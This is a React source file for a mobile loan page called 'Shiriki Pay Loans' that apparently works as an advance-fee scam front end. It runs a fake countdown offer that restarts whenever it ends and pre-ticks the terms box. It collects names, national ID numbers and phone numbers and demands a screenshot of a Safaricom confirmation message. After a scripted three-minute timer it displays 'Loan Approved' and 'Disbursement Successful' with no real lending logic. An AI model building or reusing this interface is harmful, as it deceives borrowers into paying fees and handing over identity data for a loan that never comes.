import React, { useState, useEffect } from 'react';
import {
  Clock,
  CheckCircle2,
  Upload,
  ArrowRight,
  Check,
  X,
  MoreHorizontal
} from 'lucide-react';

// Exact SVG of the Shiriki Red Swoosh Logo from the reference
function ShirikiRedLogo({ className = "w-9 h-5" }: { className?: string }) {
  return (
    <svg
      viewBox="0 0 48 24"
      fill="none"
      xmlns="http://www.w3.org/2000/svg"
      className={`${className} inline-block transform`}
    >
      <path
        d="M6 16C14 17.5 22 17 31 10.5C37 6.2 41.5 6 45 7.5C40 12.5 33 18.5 22 19C13 19.4 8.5 17.8 6 16Z"
        fill="#E52320"
      />
      <path
        d="M20 12C28 7.5 35 6 42 7C38 10 32 14.5 24 16C19 17 12 16.5 8 15C12 14 16 13 20 12Z"
        fill="#DE1B1B"
      />
    </svg>
  );
}

interface PersonalInfo {
  firstName: string;
  lastName: string;
  email: string;
  phone: string;
  idNumber: string;
  agreedToTerms: boolean;
}

export default function App() {
  const [currentStep, setCurrentStep] = useState<number>(0);
  const [loanAmount, setLoanAmount] = useState<number>(15000);
  const [activeSlide, setActiveSlide] = useState<number>(0);
  
  // Urgent countdown timer
  const [timeLeft, setTimeLeft] = useState<{ hours: number; minutes: number; seconds: number }>({
    hours: 2,
    minutes: 36,
    seconds: 40,
  });

  const [formData, setFormData] = useState<PersonalInfo>({
    firstName: '',
    lastName: '',
    email: '',
    phone: '',
    idNumber: '',
    agreedToTerms: true,
  });

  const [errors, setErrors] = useState<Record<string, string>>({});
  const [uploadedFile, setUploadedFile] = useState<File | null>(null);
  const [previewUrl, setPreviewUrl] = useState<string | null>(null);
  
  // Processing state for Step 4
  const [isProcessing, setIsProcessing] = useState<boolean>(false);
  const [processingTime, setProcessingTime] = useState<number>(180); // 3 minutes
  const [applicationId] = useState<string>(() => `SHK-${Math.floor(100000 + Math.random() * 900000)}`);
  
  const [showOptionsModal, setShowOptionsModal] = useState<boolean>(false);

  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft(prev => {
        if (prev.seconds > 0) return { ...prev, seconds: prev.seconds - 1 };
        if (prev.minutes > 0) return { ...prev, minutes: 59, seconds: 59 };
        if (prev.hours > 0) return { ...prev, hours: prev.hours - 1, minutes: 59, seconds: 59 };
        return { hours: 2, minutes: 59, seconds: 59 };
      });
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (isProcessing && processingTime > 0) {
      interval = setInterval(() => {
        setProcessingTime(t => {
          if (t <= 1) {
            setIsProcessing(false);
            return 0;
          }
          return t - 1;
        });
      }, 1000);
    }
    return () => clearInterval(interval);
  }, [isProcessing, processingTime]);

  const validateStep1 = () => {
    const newErrors: Record<string, string> = {};
    if (!formData.firstName.trim()) newErrors.firstName = 'Required';
    if (!formData.lastName.trim()) newErrors.lastName = 'Required';
    if (!formData.email.trim() || !formData.email.includes('@')) newErrors.email = 'Valid email required';
    if (!formData.phone.trim() || formData.phone.length < 9) newErrors.phone = 'Valid phone required';
    if (!formData.idNumber.trim()) newErrors.idNumber = 'National ID required';
    if (!formData.agreedToTerms) newErrors.agreedToTerms = 'Must agree to terms';
    
    if (loanAmount < 10000 || loanAmount > 19000) {
      newErrors.loanAmount = 'Strictly 10,000 - 19,000';
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files && e.target.files[0]) {
      const file = e.target.files[0];
      setUploadedFile(file);
      setPreviewUrl(URL.createObjectURL(file));
      setErrors(prev => ({ ...prev, upload: '' }));
    }
  };

  const handleSubmitApplication = () => {
    if (!uploadedFile) {
      setErrors(prev => ({ ...prev, upload: 'Upload your verification screenshot' }));
      return;
    }
    setIsProcessing(true);
    setCurrentStep(4);
  };

  const formatTimer = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs < 10 ? '0' : ''}${secs}`;
  };

  return (
    <div className="h-screen h-[100dvh] max-h-screen overflow-hidden bg-[#025928] text-white flex flex-col justify-between selection:bg-[#00B050] selection:text-white font-['Outfit'] relative">
      
      {/* Background Grid Pattern */}
      <div className="absolute inset-0 bg-shiriki-grid opacity-35 pointer-events-none z-0 [mask-image:linear-gradient(to_bottom,black_60%,transparent)]"></div>

      {/* Compact Top Header */}
      <header className="relative z-20 max-w-md w-full mx-auto px-4 pt-3 pb-1 flex items-center justify-between shrink-0">
        <button
          type="button"
          onClick={() => setCurrentStep(0)}
          className="text-left cursor-pointer group"
        >
          <span className="font-extrabold text-black tracking-tight text-lg drop-shadow-xs group-hover:text-white transition-colors">
            SHIRIKI PAY <span className="text-[#00FF66] font-black">LOANS</span>
          </span>
          <span className="block text-[9px] text-emerald-200/80 font-medium tracking-widest uppercase -mt-0.5">
            Instant Credit & Loans
          </span>
        </button>

        {/* Options Button: "... | ⨂" */}
        <button
          type="button"
          onClick={() => setShowOptionsModal(true)}
          className="bg-black/35 hover:bg-black/50 backdrop-blur-md border border-white/20 text-white rounded-full px-2.5 py-1 flex items-center gap-1.5 cursor-pointer shadow-xs transition-all text-xs"
          aria-label="Options"
        >
          <MoreHorizontal className="w-3.5 h-3.5 text-white" />
          <span className="w-px h-3 bg-white/30"></span>
          <X className="w-3.5 h-3.5 text-white" />
        </button>
      </header>

      {/* Compact Promotional Strip */}
      <div className="relative z-10 max-w-md w-full mx-auto px-4 shrink-0">
        <div className="bg-emerald-950/60 backdrop-blur-md border border-emerald-400/30 rounded-full px-3 py-1 flex items-center justify-between text-[11px] text-emerald-100 shadow-xs">
          <div className="flex items-center gap-1.5 truncate">
            <span className="w-1.5 h-1.5 rounded-full bg-amber-400 animate-ping shrink-0"></span>
            <span className="font-bold text-amber-300 uppercase text-[9px] tracking-wider shrink-0">Offer:</span>
            <span className="truncate">10k – 19k KES</span>
          </div>
          <div className="font-mono font-bold text-amber-300 text-[10px] flex items-center gap-1 shrink-0 ml-2">
            <Clock className="w-3 h-3" />
            <span>{String(timeLeft.hours).padStart(2, '0')}:{String(timeLeft.minutes).padStart(2, '0')}:{String(timeLeft.seconds).padStart(2, '0')}</span>
          </div>
        </div>
      </div>

      {/* Main Content Viewport Area (Zero Scroll, Perfectly Centered) */}
      <main className="relative z-10 max-w-md w-full mx-auto px-4 py-2 flex-1 flex flex-col justify-center overflow-hidden">

        {/* STEP 0: EXACT HOMEPAGE (Fitted without scrolling) */}
        {currentStep === 0 && (
          <div className="flex flex-col justify-between h-full py-1 animate-fadeIn">
            
            {/* Header Titles */}
            <div className="text-center my-auto">
              <h1 className="text-2xl sm:text-3xl font-extrabold text-white tracking-tight leading-tight">
                Smart payments, shared wallet
              </h1>
              <p className="text-emerald-100/90 text-xs sm:text-sm mt-1.5 max-w-xs mx-auto leading-normal">
                Decide how much freedom each beneficiary has to spend — set limits, permissions, and monitor usage.
              </p>
            </div>

            {/* The Signature Card with Center Emblem */}
            <div className="relative my-auto pt-6">
              <div className="bg-gradient-to-b from-[#187740] via-[#106233] to-[#0a4e27] rounded-[28px] p-4 pt-9 shadow-xl border border-white/20 relative">
                
                {/* Center Circle Logo */}
                <div className="absolute -top-7 left-1/2 -translate-x-1/2 w-14 h-14 rounded-full bg-white shadow-lg flex items-center justify-center border-3 border-[#025928] z-20">
                  <ShirikiRedLogo className="w-8 h-4" />
                </div>

                {/* Main White Limit Card */}
                <div className="bg-white rounded-xl p-3.5 shadow-md border border-slate-100 text-slate-800">
                  <div className="flex items-center justify-between mb-1">
                    <label className="text-[11px] text-slate-500 font-medium">
                      Enter limit (Loan Amount)
                    </label>
                    <span className="text-[9px] font-bold text-[#00A859] uppercase bg-emerald-50 px-1.5 py-0.5 rounded">
                      10k - 19k
                    </span>
                  </div>

                  <div className="border border-slate-200 rounded-lg px-3 py-2 flex items-center justify-between bg-white focus-within:ring-2 focus-within:ring-[#00A859] transition-all">
                    <input
                      type="number"
                      min="10000"
                      max="19000"
                      step="500"
                      value={loanAmount}
                      onChange={(e) => setLoanAmount(Number(e.target.value))}
                      className="w-full text-base font-bold text-slate-900 focus:outline-none font-mono"
                    />
                    <span className="text-xs font-semibold text-slate-400 pl-2">Ksh</span>
                  </div>

                  {/* Range Slider */}
                  <div className="mt-2.5">
                    <input
                      type="range"
                      min="10000"
                      max="19000"
                      step="500"
                      value={loanAmount}
                      onChange={(e) => setLoanAmount(Number(e.target.value))}
                      className="w-full h-1.5 bg-slate-200 rounded-lg appearance-none cursor-pointer accent-[#00A859]"
                    />
                    <div className="flex justify-between items-center text-[9px] text-slate-400 mt-0.5 font-mono">
                      <span>10k Ksh</span>
                      <span className="text-[#00A859] font-bold">{loanAmount.toLocaleString()} Ksh</span>
                      <span>19k Ksh</span>
                    </div>
                  </div>

                  {/* Preset Pills */}
                  <div className="grid grid-cols-4 gap-1 mt-2 pt-2 border-t border-slate-100">
                    {[10000, 13000, 16000, 19000].map(amt => (
                      <button
                        key={amt}
                        type="button"
                        onClick={() => setLoanAmount(amt)}
                        className={`py-0.5 text-[10px] font-semibold rounded border transition-all ${
                          loanAmount === amt
                            ? 'bg-[#00A859] text-white border-[#00A859]'
                            : 'bg-white text-slate-600 border-slate-200 hover:border-slate-300'
                        }`}
                      >
                        {amt / 1000}k
                      </button>
                    ))}
                  </div>

                </div>

              </div>
            </div>

            {/* 3 Indicator Dots */}
            <div className="flex items-center justify-center gap-2 my-2 shrink-0">
              <span className={`w-2 h-2 rounded-full ${activeSlide === 0 ? 'bg-white scale-110' : 'bg-white/40'}`} />
              <span className={`w-2 h-2 rounded-full ${activeSlide === 1 ? 'bg-white scale-110' : 'bg-white/40'}`} />
              <span className={`w-2 h-2 rounded-full ${activeSlide === 2 ? 'bg-white scale-110' : 'bg-white/40'}`} />
            </div>

            {/* Get Started Button */}
            <div className="shrink-0 mb-1">
              <button
                type="button"
                onClick={() => { setCurrentStep(1); setActiveSlide(1); }}
                className="w-full py-3.5 bg-[#00B050] hover:bg-[#009E47] active:bg-[#00893D] text-white font-extrabold rounded-2xl shadow-lg flex items-center justify-center gap-2 text-base tracking-wide transition-all cursor-pointer"
              >
                <span>Get Started</span>
                <ShirikiRedLogo className="w-5 h-3 brightness-110" />
              </button>
            </div>

          </div>
        )}

        {/* STEP 1: Personal Info (Compact 2-col Grid, 100% fits within page without scroll) */}
        {currentStep === 1 && (
          <div className="bg-white rounded-[24px] p-4 sm:p-5 shadow-xl border border-slate-100 text-slate-800 animate-fadeIn my-auto">
            
            {/* Header */}
            <div className="flex items-center justify-between border-b border-slate-100 pb-2 mb-3">
              <div>
                <h2 className="text-xl font-extrabold text-slate-900 tracking-tight leading-tight">
                  <span className="text-[#00A859]">Borrower</span> Details
                </h2>
                <p className="text-[11px] text-slate-500">
                  Enter your details for verification & loan payout
                </p>
              </div>
              <div className="w-9 h-9 rounded-full bg-emerald-50 border border-emerald-100 flex items-center justify-center shrink-0">
                <ShirikiRedLogo className="w-6 h-3" />
              </div>
            </div>

            {/* Amount Banner */}
            <div className="bg-[#F8FAF9] px-3 py-1.5 rounded-lg border border-slate-200 mb-2.5 flex items-center justify-between text-xs">
              <span className="text-slate-500 text-[11px]">Selected Limit:</span>
              <span className="font-extrabold text-[#00A859] font-mono text-xs">
                KES {loanAmount.toLocaleString()}
              </span>
            </div>

            {/* Form Fields: Tightly organized */}
            <div className="space-y-2 text-xs">
              
              {/* Row 1: First & Last Name */}
              <div className="grid grid-cols-2 gap-2">
                <div>
                  <input
                    type="text"
                    placeholder="First Name"
                    value={formData.firstName}
                    onChange={(e) => setFormData({ ...formData, firstName: e.target.value })}
                    className={`w-full px-3 py-2 rounded-xl border text-xs text-slate-800 placeholder-slate-400 focus:outline-none focus:ring-1 focus:ring-[#00A859] ${
                      errors.firstName ? 'border-red-400 bg-red-50/50' : 'border-slate-300'
                    }`}
                  />
                </div>
                <div>
                  <input
                    type="text"
                    placeholder="Last Name"
                    value={formData.lastName}
                    onChange={(e) => setFormData({ ...formData, lastName: e.target.value })}
                    className={`w-full px-3 py-2 rounded-xl border text-xs text-slate-800 placeholder-slate-400 focus:outline-none focus:ring-1 focus:ring-[#00A859] ${
                      errors.lastName ? 'border-red-400 bg-red-50/50' : 'border-slate-300'
                    }`}
                  />
                </div>
              </div>

              {/* Row 2: Email & National ID */}
              <div className="grid grid-cols-2 gap-2">
                <div>
                  <input
                    type="email"
                    placeholder="Email Address"
                    value={formData.email}
                    onChange={(e) => setFormData({ ...formData, email: e.target.value })}
                    className={`w-full px-3 py-2 rounded-xl border text-xs text-slate-800 placeholder-slate-400 focus:outline-none focus:ring-1 focus:ring-[#00A859] ${
                      errors.email ? 'border-red-400 bg-red-50/50' : 'border-slate-300'
                    }`}
                  />
                </div>
                <div>
                  <input
                    type="text"
                    placeholder="National ID"
                    value={formData.idNumber}
                    onChange={(e) => setFormData({ ...formData, idNumber: e.target.value })}
                    className={`w-full px-3 py-2 rounded-xl border text-xs text-slate-800 placeholder-slate-400 focus:outline-none focus:ring-1 focus:ring-[#00A859] ${
                      errors.idNumber ? 'border-red-400 bg-red-50/50' : 'border-slate-300'
                    }`}
                  />
                </div>
              </div>

              {/* Row 3: Country & Phone */}
              <div className="flex gap-1.5">
                <div className="border border-slate-300 rounded-xl px-2.5 py-1.5 bg-slate-50 flex items-center justify-center shrink-0 text-xs font-semibold text-slate-700">
                  <span>🇰🇪 +254</span>
                </div>
                <div className="flex-1">
                  <input
                    type="tel"
                    placeholder="Phone (e.g. 712...)"
                    value={formData.phone}
                    onChange={(e) => setFormData({ ...formData, phone: e.target.value })}
                    className={`w-full px-3 py-1.5 rounded-xl border text-xs text-slate-800 placeholder-slate-400 focus:outline-none focus:ring-1 focus:ring-[#00A859] ${
                      errors.phone ? 'border-red-400 bg-red-50/50' : 'border-slate-300'
                    }`}
                  />
                </div>
              </div>

              {/* Error messages if any */}
              {(errors.firstName || errors.lastName || errors.email || errors.phone || errors.idNumber) && (
                <p className="text-[10px] text-red-500 font-medium">Please fill all required fields correctly.</p>
              )}

              {/* Checkbox */}
              <label className="flex items-center gap-2 cursor-pointer pt-0.5">
                <input
                  type="checkbox"
                  checked={formData.agreedToTerms}
                  onChange={(e) => setFormData({ ...formData, agreedToTerms: e.target.checked })}
                  className="h-3.5 w-3.5 rounded text-[#00A859] focus:ring-[#00A859] border-slate-300 accent-[#00A859]"
                />
                <span className="text-[10px] text-slate-600">
                  I agree to the <span className="text-[#00A859] font-medium underline">terms & conditions</span> of Shiriki Loans.
                </span>
              </label>

              {/* Actions */}
              <div className="pt-2 space-y-1.5">
                <button
                  type="button"
                  onClick={() => {
                    if (validateStep1()) {
                      setCurrentStep(2);
                    }
                  }}
                  className="w-full py-3 bg-[#00B050] hover:bg-[#009E47] text-white font-bold rounded-xl shadow-md text-xs transition-all cursor-pointer flex items-center justify-center gap-1.5"
                >
                  <span>Next: How to Apply</span>
                  <ArrowRight className="w-3.5 h-3.5" />
                </button>

                <button
                  type="button"
                  onClick={() => setCurrentStep(0)}
                  className="w-full py-1 text-[11px] text-slate-500 hover:text-slate-800 font-semibold cursor-pointer"
                >
                  Back
                </button>
              </div>

            </div>
          </div>
        )}

        {/* STEP 2: How to Apply (Compact & Still) */}
        {currentStep === 2 && (
          <div className="bg-white rounded-[24px] p-5 shadow-xl border border-slate-100 text-slate-800 animate-fadeIn my-auto space-y-3.5">
            
            <div className="flex items-center justify-between border-b border-slate-100 pb-2.5">
              <div>
                <h2 className="text-xl font-extrabold text-slate-900 tracking-tight leading-tight">
                  <span className="text-[#00A859]">How to</span> Apply
                </h2>
                <p className="text-[11px] text-slate-500">
                  Complete these steps to finalize your loan
                </p>
              </div>
              <div className="w-9 h-9 rounded-full bg-emerald-50 border border-emerald-100 flex items-center justify-center shrink-0">
                <ShirikiRedLogo className="w-6 h-3" />
              </div>
            </div>

            {/* Clean summary info */}
            <div className="bg-[#F8FAF9] p-3 rounded-xl border border-slate-200 text-xs space-y-1">
              <div className="flex justify-between">
                <span className="text-slate-500">Applicant:</span>
                <span className="font-bold text-slate-800">{formData.firstName} {formData.lastName}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-slate-500">Receiving Line:</span>
                <span className="font-bold text-slate-800 font-mono">+254 {formData.phone}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-slate-500">Loan Amount:</span>
                <span className="font-bold text-[#00A859] font-mono">KES {loanAmount.toLocaleString()}</span>
              </div>
            </div>

            {/* Actions */}
            <div className="pt-2 space-y-2">
              <button
                type="button"
                onClick={() => setCurrentStep(3)}
                className="w-full py-3 bg-[#00B050] hover:bg-[#009E47] text-white font-bold rounded-xl shadow-md text-xs transition-all cursor-pointer flex items-center justify-center gap-1.5"
              >
                <span>Proceed to Upload Screenshot</span>
                <ArrowRight className="w-3.5 h-3.5" />
              </button>

              <button
                type="button"
                onClick={() => setCurrentStep(1)}
                className="w-full py-1 text-[11px] text-slate-500 hover:text-slate-800 font-semibold cursor-pointer"
              >
                Back to Details
              </button>
            </div>

          </div>
        )}

        {/* STEP 3: Upload Screenshot (Compact & Still) */}
        {currentStep === 3 && (
          <div className="bg-white rounded-[24px] p-4 sm:p-5 shadow-xl border border-slate-100 text-slate-800 animate-fadeIn my-auto space-y-3">
            
            <div className="border-b border-slate-100 pb-2">
              <h2 className="text-xl font-extrabold text-slate-900 tracking-tight leading-tight">
                <span className="text-[#00A859]">Upload</span> Verification
              </h2>
              <p className="text-[11px] text-slate-500">
                Upload confirmation message received from Safaricom.
              </p>
            </div>

            {/* Upload Zone */}
            <div className="border-2 border-dashed border-slate-300 rounded-xl p-3 text-center bg-[#F8FAF9] hover:border-[#00A859] transition-colors">
              <input
                type="file"
                id="verification-screenshot"
                accept="image/*"
                onChange={handleFileUpload}
                className="hidden"
              />

              {previewUrl ? (
                <div className="space-y-1.5">
                  <img src={previewUrl} alt="Preview" className="max-h-24 mx-auto rounded-lg shadow-2xs border border-slate-200 object-contain" />
                  <p className="text-[10px] font-semibold text-slate-700 truncate max-w-xs mx-auto">{uploadedFile?.name}</p>
                  <label
                    htmlFor="verification-screenshot"
                    className="inline-block text-[10px] font-bold text-[#00A859] underline cursor-pointer"
                  >
                    Change Image
                  </label>
                </div>
              ) : (
                <label htmlFor="verification-screenshot" className="cursor-pointer block py-2">
                  <div className="w-9 h-9 rounded-full bg-emerald-100 text-[#00A859] flex items-center justify-center mx-auto mb-1">
                    <Upload className="w-4 h-4" />
                  </div>
                  <span className="text-xs font-bold text-slate-800 block">Choose Screenshot</span>
                  <span className="text-[10px] text-slate-500 block">Tap to select photo from device</span>
                </label>
              )}
            </div>

            {errors.upload && (
              <p className="text-[10px] text-red-500 text-center font-semibold">{errors.upload}</p>
            )}

            {/* Checklist */}
            <div className="bg-slate-50 p-2.5 rounded-xl border border-slate-200 text-[10px] text-slate-600 space-y-0.5">
              <div className="flex items-center gap-1.5 text-emerald-700">
                <Check className="w-3 h-3 stroke-[3]" />
                <span>Screenshot confirms active Safaricom message</span>
              </div>
              <div className="flex items-center gap-1.5 text-emerald-700">
                <Check className="w-3 h-3 stroke-[3]" />
                <span>Recipient: +254 {formData.phone}</span>
              </div>
            </div>

            {/* Action Buttons */}
            <div className="pt-1 space-y-1.5">
              <button
                type="button"
                onClick={handleSubmitApplication}
                className="w-full py-3 bg-[#00B050] hover:bg-[#009E47] text-white font-bold rounded-xl shadow-md text-xs transition-all cursor-pointer flex items-center justify-center gap-1.5"
              >
                <span>I Have Completed All Steps & Submit</span>
                <Check className="w-3.5 h-3.5" />
              </button>

              <button
                type="button"
                onClick={() => setCurrentStep(2)}
                className="w-full py-1 text-[11px] text-slate-500 hover:text-slate-800 font-semibold cursor-pointer"
              >
                Back
              </button>
            </div>

          </div>
        )}

        {/* STEP 4: Processing & Confirmation (Compact & Still) */}
        {currentStep === 4 && (
          <div className="bg-white rounded-[24px] p-4 sm:p-5 shadow-xl border border-slate-100 text-slate-800 animate-fadeIn my-auto space-y-3">
            
            <div className="text-center">
              <div className="w-9 h-9 rounded-full bg-emerald-50 border border-emerald-100 flex items-center justify-center mx-auto mb-1">
                <ShirikiRedLogo className="w-6 h-3" />
              </div>
              
              <span className={`inline-block px-2.5 py-0.5 rounded-full text-[10px] font-bold ${isProcessing ? 'bg-amber-100 text-amber-800' : 'bg-emerald-100 text-[#00A859]'}`}>
                {isProcessing ? 'Verification In Progress' : 'Loan Approved'}
              </span>

              <h2 className="text-lg sm:text-xl font-extrabold tracking-tight mt-1 text-slate-900">
                {isProcessing ? 'Please Wait 2 to 3 Minutes' : 'Disbursement Successful!'}
              </h2>

              <p className="text-[10px] text-slate-500">
                Ref: <span className="font-mono font-bold text-slate-800">{applicationId}</span>
              </p>
            </div>

            {/* Timer countdown */}
            {isProcessing ? (
              <div className="bg-[#F8FAF9] p-3 rounded-xl border border-slate-200 text-center">
                <div className="text-3xl font-black font-mono text-[#00A859] tracking-tight mb-0.5">
                  {formatTimer(processingTime)}
                </div>
                <p className="text-[10px] text-slate-600">
                  Processing loan of <span className="font-bold">KES {loanAmount.toLocaleString()}</span> to <span className="font-mono font-bold">+254 {formData.phone}</span>.
                </p>

                <div className="w-full bg-slate-200 h-1.5 rounded-full overflow-hidden mt-2">
                  <div
                    className="bg-[#00A859] h-full transition-all duration-1000 ease-linear rounded-full"
                    style={{ width: `${((180 - processingTime) / 180) * 100}%` }}
                  ></div>
                </div>
              </div>
            ) : (
              <div className="bg-emerald-50 border border-emerald-200 p-3 rounded-xl text-center space-y-0.5">
                <CheckCircle2 className="w-8 h-8 text-[#00A859] mx-auto mb-0.5" />
                <h3 className="font-bold text-slate-900 text-sm">Disbursement Confirmed</h3>
                <p className="text-[10px] text-slate-600">
                  <span className="font-bold text-[#00A859]">KES {loanAmount.toLocaleString()}</span> will credit to your wallet shortly.
                </p>
              </div>
            )}

            {/* Receipt Summary */}
            <div className="bg-slate-50 p-2.5 rounded-xl border border-slate-200 text-[10px] space-y-1">
              <div className="flex justify-between border-b border-slate-200 pb-0.5">
                <span className="text-slate-500">Applicant:</span>
                <span className="font-bold text-slate-800">{formData.firstName} {formData.lastName}</span>
              </div>
              <div className="flex justify-between border-b border-slate-200 pb-0.5">
                <span className="text-slate-500">Number:</span>
                <span className="font-mono font-bold text-slate-800">+254 {formData.phone}</span>
              </div>
              <div className="flex justify-between border-b border-slate-200 pb-0.5">
                <span className="text-slate-500">Amount:</span>
                <span className="font-mono font-bold text-[#00A859]">KES {loanAmount.toLocaleString()}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-slate-500">Term:</span>
                <span className="font-bold text-slate-800">30 Days</span>
              </div>
            </div>

            {/* Reset */}
            <button
              type="button"
              onClick={() => {
                setCurrentStep(0);
                setUploadedFile(null);
                setPreviewUrl(null);
                setIsProcessing(false);
                setProcessingTime(180);
              }}
              className="w-full py-2.5 bg-[#00B050] hover:bg-[#009E47] text-white font-bold rounded-xl text-xs transition-all cursor-pointer"
            >
              Back to Home
            </button>

          </div>
        )}

      </main>

      {/* Options Modal (when user clicks "... | ⨂" top right) */}
      {showOptionsModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-xs">
          <div className="bg-white rounded-[24px] max-w-xs w-full p-5 shadow-2xl border border-slate-200 text-slate-800">
            <div className="flex items-center justify-between pb-2 border-b border-slate-100 mb-2">
              <div className="flex items-center gap-1.5">
                <ShirikiRedLogo className="w-5 h-2.5" />
                <span className="font-extrabold text-xs text-slate-900">SHIRIKI PAY <span className="text-[#00A859]">LOANS</span></span>
              </div>
              <button
                type="button"
                onClick={() => setShowOptionsModal(false)}
                className="text-slate-400 hover:text-slate-600 font-bold text-base cursor-pointer"
              >
                ✕
              </button>
            </div>
            <div className="space-y-1.5 text-xs text-slate-600">
              <button
                type="button"
                onClick={() => { setCurrentStep(0); setShowOptionsModal(false); }}
                className="w-full text-left py-1.5 px-2.5 rounded-lg hover:bg-slate-100 font-semibold text-slate-800 block text-xs"
              >
                🏠 Home Screen
              </button>
              <button
                type="button"
                onClick={() => { setCurrentStep(1); setShowOptionsModal(false); }}
                className="w-full text-left py-1.5 px-2.5 rounded-lg hover:bg-slate-100 font-semibold text-slate-800 block text-xs"
              >
                📝 Personal Details Form
              </button>
              <button
                type="button"
                onClick={() => { setCurrentStep(2); setShowOptionsModal(false); }}
                className="w-full text-left py-1.5 px-2.5 rounded-lg hover:bg-slate-100 font-semibold text-slate-800 block text-xs"
              >
                📖 How to Apply
              </button>
              <div className="pt-1.5 border-t border-slate-100 text-[10px] text-slate-500">
                Helpline: 0800 221 334 (Toll-free, 24/7)
              </div>
            </div>
            <button
              type="button"
              onClick={() => setShowOptionsModal(false)}
              className="mt-3 w-full py-2 bg-[#00B050] hover:bg-[#009E47] text-white font-bold text-xs rounded-xl cursor-pointer"
            >
              Close
            </button>
          </div>
        </div>
      )}

    </div>
  );
}
